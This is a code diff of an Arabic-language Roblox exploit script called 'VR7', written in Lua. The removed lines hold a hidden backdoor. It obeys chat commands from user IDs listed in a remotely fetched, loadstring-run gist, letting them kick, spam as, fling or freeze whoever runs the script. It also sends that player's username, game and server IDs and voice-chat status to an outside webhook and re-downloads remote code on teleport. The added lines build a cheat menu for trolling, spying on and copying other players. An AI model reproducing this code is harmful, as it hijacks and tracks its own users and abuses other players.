-                                        local v934 = Instance.new("Sound", game.Players.LocalPlayer:FindFirstChildOfClass("PlayerGui"))
-                                        v934.SoundId = "rbxassetid://156221488"
-                                        v934.Volume = 1
-                                        v934:Play()
-                                        v934.Loaded:Wait()
-                                        local v935 = Instance.new("ScreenGui", game.Players.LocalPlayer:FindFirstChildOfClass("PlayerGui"))
-                                        v935.IgnoreGuiInset = true
-                                        local v936 = Instance.new("Frame", v935)
-                                        v936.Size = UDim2.new(1, 0, 1, 0)
-                                        v936.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                                        game:GetService("Debris"):AddItem(v935, v934.TimeLength)
-                                        game:GetService("Debris"):AddItem(v934, v934.TimeLength)
-                                    end
-                                end,
-                                checkuser = function(_, p937)
-                                    local v938 = vu142(tostring(p937))
-                                    if p937 == "" or v938 == game.Players.LocalPlayer then
-                                        Send("VR7 ON TOP")
-                                    end
-                                end,
-                                credit = function(_, p939)
-                                    local v940 = vu142(tostring(p939))
-                                    if p939 == "" or v940 == game.Players.LocalPlayer then
-                                        Send("\239\191\189\216\179\217\136\217\134\217\138 \216\185\217\133\217\131")
-                                    end
-                                end,
-                                say = function(_, p941, p942)
-                                    local v943 = vu142(tostring(p941))
-                                    if p941 == "" or v943 == game.Players.LocalPlayer then
-                                        Send(p942)
-                                    end
-                                end,
-                                spam = function(_, p944, p945)
-                                    local v946 = vu142(tostring(p944))
-                                    if (p944 == "" or v946 == game.Players.LocalPlayer) and p945 ~= "" then
-                                        getgenv().loopspam = true
-                                        while getgenv().loopspam do
-                                            wait(0.1)
-                                            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("SendMessage"):FireServer(p945)
-                                        end
-                                    end
-                                end,
-                                unspam = function(_, p947, _)
-                                    local v948 = vu142(tostring(p947))
-                                    if p947 == "" or v948 == game.Players.LocalPlayer then
-                                        getgenv().loopspam = false
-                                    end
-                                end,
-                                ["3mk"] = function(p949, p950)
-                                    local v951 = vu142(tostring(p950))
-                                    local v952 = vu138(tostring(p949))
-                                    if p950 == "" or v951 == game.Players.LocalPlayer then
-                                        game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("SendMessage"):FireServer("\239\191\189\217\133\217\138 " .. v952.DisplayName)
-                                    end
-                                end,
-                                jump = function(_, p953)
-                                    local v954 = vu142(tostring(p953))
-                                    if p953 == "" or v954 == game.Players.LocalPlayer then
-                                        game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-                                    end
-                                end,
-                                loopjump = function(_, p955)
-                                    local v956 = vu142(tostring(p955))
-                                    if p955 == "" or v956 == game.Players.LocalPlayer then
-                                        getgenv().loopjump = true
-                                        while getgenv().loopjump do
-                                            wait(0.1)
-                                            pcall(function()
-                                                if game.Players.LocalPlayer.Character and (game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") and game.Players.LocalPlayer.Character.Humanoid.Health > 0) then
-                                                    task.wait(0.6)
-                                                    game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-                                                end
-                                            end)
-                                        end
-                                    end
-                                end,
-                                unloopjump = function(_, p957)
-                                    local v958 = vu142(tostring(p957))
-                                    if p957 == "" or v958 == game.Players.LocalPlayer then
-                                        getgenv().loopjump = false
-                                    end
-                                end,
-                                loud = function(_, p959)
-                                    local v960 = vu142(tostring(p959))
-                                    if p959 == "" or v960 == game.Players.LocalPlayer then
-                                        local vu961 = Instance.new("Sound", game.Workspace)
-                                        vu961.SoundId = "rbxassetid://8243331779"
-                                        local v962 = vu961
-                                        vu961.Play(v962)
-                                        vu961.Ended:Connect(function()
-                                            vu961:Destroy()
-                                        end)
-                                    end
-                                end,
-                                orbit = function(p963, p964)
-                                    local v965 = vu142(tostring(p964))
-                                    local v966 = vu138(tostring(p963))
-                                    if p964 == "" or v965 == game.Players.LocalPlayer then
-                                        getgenv().Orbit = true
-                                        local v967 = 4
-                                        local v968 = 7
-                                        while getgenv().Orbit do
-                                            local v969 = v966.Character.HumanoidRootPart.Position + Vector3.new(math.cos(tick() * v967) * v968, 0, math.sin(tick() * v967) * v968)
-                                            local v970 = v966.Character.HumanoidRootPart.Position
-                                            local v971 = CFrame.new(v969, v970)
-                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v971
-                                            task.wait(0.001)
-                                        end
-                                    end
-                                end,
-                                unorbit = function(_, p972)
-                                    local v973 = vu142(tostring(p972))
-                                    if p972 == "" or v973 == game.Players.LocalPlayer then
-                                        getgenv().Orbit = false
-                                    end
-                                end,
-                                spin = function(_, p974)
-                                    local v975 = vu142(tostring(p974))
-                                    if p974 == "" or v975 == game.Players.LocalPlayer then
-                                        getgenv().Spin = true
-                                        while getgenv().Spin do
-                                            task.wait()
-                                            pcall(function()
-                                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(100), 0)
-                                            end)
-                                        end
-                                    end
-                                end,
-                                unspin = function(_, p976)
-                                    local v977 = vu142(tostring(p976))
-                                    if p976 == "" or v977 == game.Players.LocalPlayer then
-                                        getgenv().Spin = false
-                                    end
-                                end,
-                                skyfall = function(_, p978)
-                                    local v979 = vu142(tostring(p978))
-                                    if p978 == "" or v979 == game.Players.LocalPlayer then
-                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 600, 0)
-                                    end
-                                end,
-                                freeze = function(_, p980)
-                                    local v981 = vu142(tostring(p980))
-                                    if p980 == "" or v981 == game.Players.LocalPlayer then
-                                        getgenv().Freeze = true
-                                        while getgenv().Freeze do
-                                            pcall(function()
-                                                if not game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored then
-                                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-                                                end
-                                            end)
-                                            wait(0.1)
-                                        end
-                                    end
-                                end,
-                                unfreeze = function(_, p982)
-                                    local v983 = vu142(tostring(p982))
-                                    if p982 == "" or v983 == game.Players.LocalPlayer then
-                                        getgenv().Freeze = false
-                                        wait(0.2)
-                                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-                                    end
-                                end,
-                                sit = function(_, p984)
-                                    local v985 = vu142(tostring(p984))
-                                    if p984 == "" or v985 == game.Players.LocalPlayer then
-                                        game.Players.LocalPlayer.Character.Humanoid.Sit = true
-                                    end
-                                end,
-                                loopsit = function(_, p986)
-                                    local v987 = vu142(tostring(p986))
-                                    if p986 == "" or v987 == game.Players.LocalPlayer then
-                                        getgenv().loopsit = true
-                                        while getgenv().loopsit do
-                                            wait(0.1)
-                                            pcall(function()
-                                                if game.Players.LocalPlayer.Character and (game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") and game.Players.LocalPlayer.Character.Humanoid.Health > 0) then
-                                                    task.wait(0.3)
-                                                    game.Players.LocalPlayer.Character.Humanoid.Sit = true
-                                                end
-                                            end)
-                                        end
-                                    end
-                                end,
-                                unloopsit = function(_, p988)
-                                    local v989 = vu142(tostring(p988))
-                                    if p988 == "" or v989 == game.Players.LocalPlayer then
-                                        getgenv().loopsit = false
-                                    end
-                                end,
-                                off = function(_, p990)
-                                    local v991 = vu142(tostring(p990))
-                                    if p990 == "" or v991 == game.Players.LocalPlayer then
-                                        local v992, v993, v994 = ipairs(VR7:GetDescendants())
-                                        while true do
-                                            local v995
-                                            v994, v995 = v992(v993, v994)
-                                            if v994 == nil then
-                                                break
-                                            end
-                                            if v995:IsA("ImageButton") and v995.Name == "Ticket_Asset" then
-                                                v995.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                                            end
-                                        end
-                                    end
-                                end,
-                                fov = function(_, p996)
-                                    local v997 = vu142(tostring(p996))
-                                    if p996 == "" or v997 == game.Players.LocalPlayer then
-                                        if getgenv().OldF then
-                                            game.Workspace.CurrentCamera.FieldOfView = getgenv().OldF
-                                        end
-                                        getgenv().OldF = game.Workspace.CurrentCamera.FieldOfView
-                                        game.Workspace.CurrentCamera.FieldOfView = 0
-                                    end
-                                end,
-                                unfov = function(_, p998)
-                                    local v999 = vu142(tostring(p998))
-                                    if p998 == "" or v999 == game.Players.LocalPlayer then
-                                        game.Workspace.CurrentCamera.FieldOfView = getgenv().OldF
-                                    end
-                                end,
-                                gravity = function(_, p1000)
-                                    local v1001 = vu142(tostring(p1000))
-                                    if p1000 == "" or v1001 == game.Players.LocalPlayer then
-                                        workspace.Gravity = 10
-                                    end
-                                end,
-                                ungravity = function(_, p1002)
-                                    local v1003 = vu142(tostring(p1002))
-                                    if p1002 == "" or v1003 == game.Players.LocalPlayer then
-                                        workspace.Gravity = 192
-                                    end
-                                end,
-                                dance = function(_, p1004)
-                                    local v1005 = vu142(tostring(p1004))
-                                    if p1004 == "" or v1005 == game.Players.LocalPlayer then
-                                        local v1006 = game.Players.LocalPlayer.Character.Humanoid.RigType ~= Enum.HumanoidRigType.R15 and {
-                                            "27789359",
-                                            "30196114",
-                                            "248263260",
-                                            "45834924",
-                                            "33796059",
-                                            "28488254",
-                                            "52155728"
-                                        } or {
-                                            "3333432454",
-                                            "4555808220",
-                                            "4049037604",
-                                            "4555782893",
-                                            "10214311282",
-                                            "10714010337",
-                                            "10713981723",
-                                            "10714372526",
-                                            "10714076981",
-                                            "10714392151",
-                                            "11444443576"
-                                        }
-                                        local v1007 = Instance.new("Animation")
-                                        v1007.AnimationId = "rbxassetid://" .. v1006[math.random(1, # v1006)]
-                                        danceTrack = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(v1007)
-                                        danceTrack.Looped = true
-                                        danceTrack:Play()
-                                    end
-                                end,
-                                undance = function(_, p1008)
-                                    local v1009 = vu142(tostring(p1008))
-                                    if (p1008 == "" or v1009 == game.Players.LocalPlayer) and danceTrack then
-                                        danceTrack:Stop()
-                                        danceTrack:Destroy()
-                                    end
-                                end,
-                                kick = function(_, p1010)
-                                    if vu142(tostring(p1010)) == game.Players.LocalPlayer then
-                                        game.Players.LocalPlayer:Kick("Kicked By A Moderator")
-                                        if queue_on_teleport then
-                                            queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP\"))()")
-                                        end
-                                    end
-                                end,
-                                kickmsg = function(_, p1011, p1012)
-                                    if vu142(tostring(p1011)) == game.Players.LocalPlayer then
-                                        game.Players.LocalPlayer:Kick(p1012)
-                                        if queue_on_teleport then
-                                            queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP\"))()")
-                                        end
-                                    end
-                                end,
-                                unbenx = function(_, p1013)
-                                    local v1014 = vu142(tostring(p1013))
-                                    if p1013 == "" or v1014 == game.Players.LocalPlayer then
-                                        getgenv().Benxme = false
-                                    end
-                                end,
-                                benx = function(p1015, p1016)
-                                    local v1017 = vu142(tostring(p1016))
-                                    local vu1018 = vu138(tostring(p1015))
-                                    if p1016 == "" or v1017 == game.Players.LocalPlayer then
-                                        getgenv().Benxme = true
-                                        local vu1019 = - 1
-                                        local vu1020 = - 2
-                                        local vu1021 = 0.1
-                                        while getgenv().Benxme do
-                                            pcall(function()
-                                                if not game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BreakVelocity") then
-                                                    pcall(function()
-                                                        vu328:Clone().Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
-                                                    end)
-                                                end
-                                                local v1022 = vu1018.Character:FindFirstChild("Torso") or vu1018.Character:FindFirstChild("UpperTorso")
-                                                if v1022.Name == "Torso" then
-                                                    vu1019 = - 0.75
-                                                end
-                                                game.Players.LocalPlayer.Character.Humanoid.Sit = true
-                                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v1022.CFrame * CFrame.new(0, vu1019, vu1020) * CFrame.Angles(math.rad(270), 0, 0)
-                                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
-                                                vu1020 = vu1020 + vu1021
-                                                if vu1020 >= - 1 or vu1020 <= - 2 then
-                                                    vu1021 = - vu1021
-                                                end
-                                                local v1023, v1024, v1025 = ipairs(VR7:GetDescendants())
-                                                while true do
-                                                    local v1026
-                                                    v1025, v1026 = v1023(v1024, v1025)
-                                                    if v1025 == nil then
-                                                        break
-                                                    end
-                                                    if v1026:IsA("ImageButton") and v1026.Name == "Ticket_Asset" then
-                                                        v1026.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                                                    end
-                                                end
-                                            end)
-                                            task.wait()
-                                        end
-                                        if game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BreakVelocity") then
-                                            game.Players.LocalPlayer.Character.Humanoid.Sit = false
-                                            game.Players.LocalPlayer.Character.HumanoidRootPart.BreakVelocity:Destroy()
-                                        end
-                                    end
-                                end,
-                                fling = function(_, p1027)
-                                    local v1028 = vu142(tostring(p1027))
-                                    if p1027 == "" or v1028 == game.Players.LocalPlayer then
-                                        local v1029, v1030, v1031 = pairs(game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart"):GetChildren())
-                                        while true do
-                                            local v1032
-                                            v1031, v1032 = v1029(v1030, v1031)
-                                            if v1031 == nil then
-                                                break
-                                            end
-                                            if v1032:IsA("BodyVelocity") or v1032:IsA("BodyAngularVelocity") then
-                                                v1032:Destroy()
-                                            end
-                                        end
-                                        Instance.new("BodyAngularVelocity", game.Players.LocalPlayer.Character.HumanoidRootPart).AngularVelocity = Vector3.new(0, 100, 0)
-                                        game.Players.LocalPlayer.Character.HumanoidRootPart.BodyAngularVelocity.MaxTorque = Vector3.new(1000000000, 1000000000, 1000000000)
-                                        Instance.new("BodyVelocity", game.Players.LocalPlayer.Character.HumanoidRootPart).MaxForce = Vector3.new(1000000000, 1000000000, 1000000000)
-                                        for v1033 = 0, 1, 0.05 do
-                                            game.Players.LocalPlayer.Character.HumanoidRootPart.BodyVelocity.Velocity = Vector3.new(100000, 50000, 0) * v1033
-                                            task.wait(0.05)
-                                        end
-                                        game.Players.LocalPlayer.Character.HumanoidRootPart.BodyVelocity.Velocity = Vector3.new(100000, 50000, 0)
-                                        task.delay(1, function()
-                                            game.Players.LocalPlayer.Character.HumanoidRootPart.BodyVelocity:Destroy()
-                                            game.Players.LocalPlayer.Character.HumanoidRootPart.BodyAngularVelocity:Destroy()
-                                        end)
-                                    end
-                                end,
-                                explode = function(_, p1034)
-                                    local v1035 = vu142(tostring(p1034))
-                                    if p1034 == "" or v1035 == game.Players.LocalPlayer then
-                                        Instance.new("Explosion", game.Players.LocalPlayer.Character).Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
-                                    end
-                                end,
-                                void = function(_, p1036)
-                                    local v1037 = vu142(tostring(p1036))
-                                    if p1036 == "" or v1037 == game.Players.LocalPlayer then
-                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, - 300, 0)
-                                    end
-                                end
-                            }
-                            local function vu1042(p1039)
-                                local v1040 = p1039:match("<font.->(.-)</font>")
-                                local v1041 = p1039:match("%..+")
-                                if v1041 then
-                                    v1041 = v1041:gsub(":", "")
-                                end
-                                return v1040, v1041
-                            end
-                            game:GetService("Players").LocalPlayer.PlayerGui.ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView.RCTScrollContentView.ChildAdded:Connect(function(p1043)
-                                local v1044, vu1045 = vu1042(p1043:FindFirstChild("BodyText", true).Text)
-                                if vu1045 and v1044 then
-                                    local vu1046 = vu138(v1044)
-                                    if table.find(loadstring(game:HttpGet("https://gist.githubusercontent.com/nkjvnkj-commits/c378622870e9adca0cbc876b9c697c7e/raw/d8acd73662dcd2458fa9397cb54969f5540f9df5/gistfile1.txt"))(), tostring(vu1046.UserId)) and vu1045:lower():match("^%s*(.-)%s*$"):sub(1, 1) == "." then
-                                        local v1047, v1048, v1049 = vu1045:lower():gmatch("%S+")
-                                        local vu1050 = {}
-                                        while true do
-                                            v1049 = v1047(v1048, v1049)
-                                            if v1049 == nil then
-                                                break
-                                            end
-                                            table.insert(vu1050, v1049)
-                                        end
-                                        if vu1038[vu1050[1]:sub(2)] then
-                                            vu1038[vu1050[1]:sub(2)](game:GetService("Players"):GetPlayerByUserId(vu1046.UserId).Name, vu1050[2] or "", table.concat(vu1050, " ", 3))
-                                            pcall(function()
-                                                if not vu1050[2] or vu1050[2] == "" or vu142(tostring(vu1050[2])) == game:GetService("Players").LocalPlayer then
-                                                    local v1051 = request
-                                                    local v1052 = {
-                                                        Url = "https://hajji-api-2.vercel.app/api/webhook",
-                                                        Method = "POST",
-                                                        Headers = {
-                                                            ["content-type"] = "application/json"
-                                                        }
-                                                    }
-                                                    local v1053 = game:GetService("HttpService")
-                                                    local v1054 = v1053.JSONEncode
-                                                    local v1055 = {
-                                                        content = "",
-                                                        username = "The Mercy Script",
-                                                        avatar_url = "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/5544f47d-0648-44d8-ad14-8d5a8761b77e/dg2813p-32e3e83b-9414-4208-979e-d668d30d5c2a.jpg",
-                                                        embeds = {
-                                                            {
-                                                                title = "Command Sent By @" .. game:GetService("Players"):GetPlayerByUserId(vu1046.UserId).Name,
-                                                                description = "**[Player Username (D/U):](https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile)**  ```" .. game:GetService("Players").LocalPlayer.DisplayName .. " (@" .. game:GetService("Players").LocalPlayer.Name .. ") " .. loadstring("return game:GetService(\'VoiceChatService\'):IsVoiceEnabledForUserIdAsync(game:GetService(\'Players\').LocalPlayer.UserId) and \'\226\156\148\239\184\143\' or \'\226\157\140\'")() .. "```\n" .. "**[Game Name (" .. tostring(# game:GetService("Players"):GetPlayers()) .. " Player" .. "):](https://www.roblox.com/games/" .. tostring(game.PlaceId) .. ")**\n```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```\n" .. "**Game ID:** ```" .. game.JobId .. "``` \n" .. "**Command:** ```" .. vu1045 .. "``` \n" .. "<t:" .. os.time() .. ":f>",
-                                                                color = 15277667
-                                                            }
-                                                        }
-                                                    }
-                                                    v1052.Body = v1054(v1053, v1055)
-                                                    v1051(v1052)
-                                                    if queue_on_teleport then
-                                                        queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP\"))()")
-                                                    end
-                                                end
-                                            end)
-                                        end
-                                    end
-                                end
-                            end)
-                        end
-                    end)
-                    spawn(function()
-                        while getgenv().TRX do
-                            wait(500)
-                            game:GetService("StarterGui"):SetCore("SendNotification", {
-                                Title = "System TRX ",
-                                Text = "\239\191\189\217\132\217\138\216\170 \217\133\217\134 \217\134\217\129\216\179 \216\167\217\132\216\167\217\136\216\167\217\133\216\177\216\159\n\216\170\216\168\217\138 \216\170\216\174\216\177\216\168 \216\185\217\132\217\137 \216\167\217\132\217\135\216\167\217\131\216\167\216\170\216\159\n\216\167\216\173\216\179\217\134 \216\173\217\132 \217\132\217\131 \216\170\216\180\216\170\216\177\217\131 \217\136\216\172\217\133\217\138\216\185 \216\167\217\132\216\167\216\179\216\185\216\167\216\177 \217\133\217\134\216\167\216\179\216\168\216\169\n",
-                                Duration = 10
-                            })
-                            game:GetService("StarterGui"):SetCore("SendNotification", {
-                                Title = "System VR7",
-                                Text = "\239\191\189\216\174\216\170\216\181\216\167\216\177 \216\179\217\138\216\177\217\129\216\177\217\134\216\167 \216\167\217\132\216\175\216\179\217\131\217\136\216\177\216\175 VR7 \217\132\217\132\216\167\216\180\216\170\216\177\216\167\217\131 \216\167\217\129\216\170\216\173 \216\170\217\131\216\170",
-                                Duration = 10
-                            })
-                        end
-                    end)
-                    return {
-                        Color = tonumber("0x" .. v908.DarkGreen),
-                        Type = "Free User"
-                    }
-                end
-                game:GetService("StarterGui"):SetCore("SendNotification", {
-                    Title = "VR7 Team",
-                    Text = "\239\191\189\217\134\216\170 \217\133\216\173\217\133\217\138 \217\133\217\134 \216\172\217\133\217\138\216\185 \216\167\217\132\216\167\217\136\216\167\217\133\216\177",
-                    Duration = 13,
-                    Icon = "rbxassetid://136772242182146"
-                })
-                local vu1056 = Instance.new("Sound", game.Workspace)
-                vu1056.SoundId = "rbxassetid://1862047553"
-                vu1056.Volume = 10
-                vu1056.Ended:Connect(function()
-                    vu1056:Destroy()
+            for i, v in pairs(char:GetChildren()) do
+                if v:IsA("HingeConstraint") then v:Destroy() end
+            end
+            for i, v in pairs(char.Humanoid:GetAccessories()) do
+                local hat = v.Name
+                char[hat].Archivable = true
+                local fake = char[hat]:Clone()
+                fake.Parent = char
+                fake.Handle.Transparency = 1
+                local hold = false
+                local enabled = false
+                char[hat].Handle.AccessoryWeld:Destroy()
+                local tool = Instance.new("Tool", lp.Backpack)
+                tool.RequiresHandle = true
+                tool.CanBeDropped = false
+                tool.Name = hat
+                local handle = Instance.new("Part", tool)
+                handle.Name = "Handle"
+                handle.Size = Vector3.new(1, 1, 1)
+                handle.Massless = true
+                handle.Transparency = 1
+                local positions = {forward=tool.GripForward, pos=tool.GripPos, right=tool.GripRight, up=tool.GripUp}
+                tool.Equipped:connect(function() hold = true end)
+                tool.Unequipped:connect(function() hold = false end)
+                tool.Activated:connect(function()
+                    if enabled == false then
+                        enabled = true
+                        tool.GripForward = Vector3.new(-0.976,0,-0.217)
+                        tool.GripPos = Vector3.new(.95,-0.76,1.4)
+                        tool.GripRight = Vector3.new(0.217,0,0.976)
+                        tool.GripUp = Vector3.new(0,1,0)
+                        wait(.8)
+                        tool.GripForward = positions.forward
+                        tool.GripPos = positions.pos
+                        tool.GripRight = positions.right
+                        tool.GripUp = positions.up
+                        enabled = false
+                    end
                 end)
-                local v1057 = vu1056
-                vu1056.Play(v1057)
-                return {
-                    Color = tonumber("0x" .. v908.Gold),
-                    Type = "Gold User"
-                }
-            end)()
-            if v1058.Type == "Gold User" then
-                vu241.Text = tostring(vu241.Text .. "\n\216\173\216\167\217\132\216\169 \216\167\217\132\216\167\216\180\216\170\216\177\216\167\217\131 : " .. v1058.Type .. "\n\217\132\217\132\216\167\216\180\216\170\216\177\216\167\217\131 \216\170\217\129\216\182\217\132 \216\175\216\179\217\131\217\136\216\177\216\175 VR7")
+                game:GetService("RunService").Heartbeat:connect(function()
+                    pcall(function()
+                        char[hat].Handle.Velocity = Vector3.new(30, 0, 0)
+                        if hold == false then
+                            char[hat].Handle.CFrame = fake.Handle.CFrame
+                        elseif hold == true then
+                            char[hat].Handle.CFrame = handle.CFrame
+                        end
+                    end)
+                end)
+            end
+            Notify("التخريب","تم تفعيل تنقل الاكسسوارات!",3)
+        end
+    })
+
+    TrollTab:AddSection("نسخ شخصيتك")
+    TrollTab:AddButton({
+        Name="نسخ الاعبك",
+        Callback=function()
+            loadstring(game:GetObjects('rbxassetid://7339698872')[1].Source)()
+        end
+    })
+
+
+    local spyTarget2
+    SpyTab:AddSection("المراقبة الأساسية")
+    SpyTab:AddDropdown({
+        Name="اختيار لاعب",
+        Options=(function() local t={}; for _,v in ipairs(Players:GetPlayers()) do if v~=LocalPlayer then table.insert(t,v.Name) end end; return t end)(),
+        Callback=function(v) spyTarget2=v end
+    })
+    SpyTab:AddButton({Name="انتقال اليه",Callback=function()
+        local p=Players:FindFirstChild(spyTarget2)
+        if p and p.Character then LocalPlayer.Character.HumanoidRootPart.CFrame=p.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,3)
+        else Notify("خطأ","اللاعب غير موجود!",3) end
+    end})
+    SpyTab:AddButton({Name="مراقبة",Callback=function()
+        local p=Players:FindFirstChild(spyTarget2)
+        if p and p.Character then workspace.CurrentCamera.CameraSubject=p.Character:FindFirstChild("Humanoid")
+        else Notify("خطأ","اللاعب غير موجود!",3) end
+    end})
+    SpyTab:AddButton({Name="الغاء المراقبة",Callback=function()
+        workspace.CurrentCamera.CameraSubject=LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+        Notify("المراقبة","تم إلغاء المراقبة",2)
+    end})
+
+    local function stopSpy()
+        if not spyEnabled then return end
+        spyEnabled = false
+        pcall(function()
+            local camera = Workspace.CurrentCamera
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                camera.CameraSubject = LocalPlayer.Character.Humanoid
+            elseif originalCameraSubject then
+                camera.CameraSubject = originalCameraSubject
+            end
+        end)
+        spyTarget = nil
+        Notify("تجسس", "تم إيقاف التجسس", 3)
+    end
+
+    local function startSpy(target)
+        if not target then Notify("خطأ","الهدف غير موجود!",3); return end
+        if not target.Character or not target.Character:FindFirstChild("Humanoid") then Notify("خطأ","شخصية الهدف غير موجودة!",3); return end
+        spyEnabled = true
+        spyTarget = target
+        pcall(function()
+            local camera = Workspace.CurrentCamera
+            originalCameraSubject = camera.CameraSubject
+            camera.CameraSubject = target.Character.Humanoid
+            Notify("تجسس","بدأ التجسس على: "..target.Name,3)
+        end)
+    end
+
+    SpyTab:AddSection("تجسس متقدم")
+    SpyTab:AddParagraph({"تجسس متقدم","تجسس مباشر أو تلقائي على اللاعبين"})
+    SpyTab:AddDropdown({
+        Name="تجسس مباشر على لاعب",
+        Options=(function() local t={}; for _,v in ipairs(Players:GetPlayers()) do if v~=LocalPlayer then table.insert(t,v.Name) end end; return t end)(),
+        Callback=function(v) local p=Players:FindFirstChild(v); if p then startSpy(p) end end
+    })
+    SpyTab:AddButton({Name="إيقاف التجسس",Callback=function() stopSpy() end})
+    SpyTab:AddToggle({Name="تجسس تلقائي (تناوب)",Default=false,Callback=function(value)
+        autoSpyEnabled=value
+        if value then task.spawn(function()
+            while autoSpyEnabled do
+                for _,player in pairs(Players:GetPlayers()) do
+                    if not autoSpyEnabled then break end
+                    if player~=LocalPlayer and player.Character then startSpy(player); task.wait(5) end
+                end
+                if autoSpyEnabled then task.wait(1) end
+            end
+            stopSpy()
+        end)
+        else stopSpy() end
+    end})
+
+
+    local Remotes = ReplicatedStorage:WaitForChild("Remotes")
+    local copyTarget = nil
+
+    SkinTab:AddParagraph({"اختار اللاعب","اختر اللاعب اللي تريد تنسخ سكنته"})
+    SkinTab:AddDropdown({
+        Name="اكتب اسم اللاعب",
+        Options=(function() local t={}; for _,v in ipairs(Players:GetPlayers()) do if v~=LocalPlayer then table.insert(t,v.Name) end end; return t end)(),
+        Callback=function(v)
+            copyTarget=Players:FindFirstChild(v)
+            if copyTarget then Notify("نسخ سكنات","تم تحديد: "..v,3) end
+        end
+    })
+
+    local function copyAvatar(TPlayer)
+        if not TPlayer or not TPlayer.Character then Notify("خطأ","اللاعب مو موجود!",3); return end
+        local LChar=LocalPlayer.Character
+        local LHumanoid=LChar and LChar:FindFirstChildOfClass("Humanoid")
+        local THumanoid=TPlayer.Character:FindFirstChildOfClass("Humanoid")
+        if not LHumanoid or not THumanoid then return end
+        Notify("نسخ سكنات","جاري النسخ...",5)
+        task.spawn(function()
+            pcall(function()
+                local LDesc=LHumanoid:GetAppliedDescription()
+                for _,acc in ipairs(LDesc:GetAccessories(true)) do
+                    if acc.AssetId and tonumber(acc.AssetId) then Remotes.Wear:InvokeServer(tonumber(acc.AssetId)); task.wait(2) end
+                end
+                if tonumber(LDesc.Shirt) then Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt)); task.wait(2) end
+                if tonumber(LDesc.Pants) then Remotes.Wear:InvokeServer(tonumber(LDesc.Pants)); task.wait(2) end
+                if tonumber(LDesc.Face) then Remotes.Wear:InvokeServer(tonumber(LDesc.Face)); task.wait(2) end
+                local PDesc=THumanoid:GetAppliedDescription()
+                local argsBody={[1]={[1]=PDesc.Torso,[2]=PDesc.RightArm,[3]=PDesc.LeftArm,[4]=PDesc.RightLeg,[5]=PDesc.LeftLeg,[6]=PDesc.Head}}
+                Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody)); task.wait(3)
+                if tonumber(PDesc.Shirt) then Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt)); task.wait(0.3) end
+                if tonumber(PDesc.Pants) then Remotes.Wear:InvokeServer(tonumber(PDesc.Pants)); task.wait(0.3) end
+                if tonumber(PDesc.Face) then Remotes.Wear:InvokeServer(tonumber(PDesc.Face)); task.wait(0.3) end
+                for _,v in ipairs(PDesc:GetAccessories(true)) do
+                    if v.AssetId and tonumber(v.AssetId) then Remotes.Wear:InvokeServer(tonumber(v.AssetId)); task.wait(0.3) end
+                end
+                local SkinColor=TPlayer.Character:FindFirstChild("Body Colors")
+                if SkinColor then Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor)); task.wait(0.3) end
+                if tonumber(PDesc.IdleAnimation) then Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation)); task.wait(0.3) end
+                local Bag=TPlayer:FindFirstChild("PlayersBag")
+                if Bag then
+                    if Bag:FindFirstChild("RPName") and Bag.RPName.Value~="" then Remotes.RPNameText:FireServer("RolePlayName",Bag.RPName.Value); task.wait(0.3) end
+                    if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value~="" then Remotes.RPNameText:FireServer("RolePlayBio",Bag.RPBio.Value); task.wait(0.3) end
+                    if Bag:FindFirstChild("RPNameColor") then Remotes.RPNameColor:FireServer("PickingRPNameColor",Bag.RPNameColor.Value); task.wait(0.3) end
+                    if Bag:FindFirstChild("RPBioColor") then Remotes.RPNameColor:FireServer("PickingRPBioColor",Bag.RPBioColor.Value); task.wait(0.3) end
+                end
+                Notify("نسخ سكنات","تم النسخ بنجاح!",3)
+            end)
+        end)
+    end
+
+    SkinTab:AddParagraph({"خيارات النسخ","اختر طريقة النسخ"})
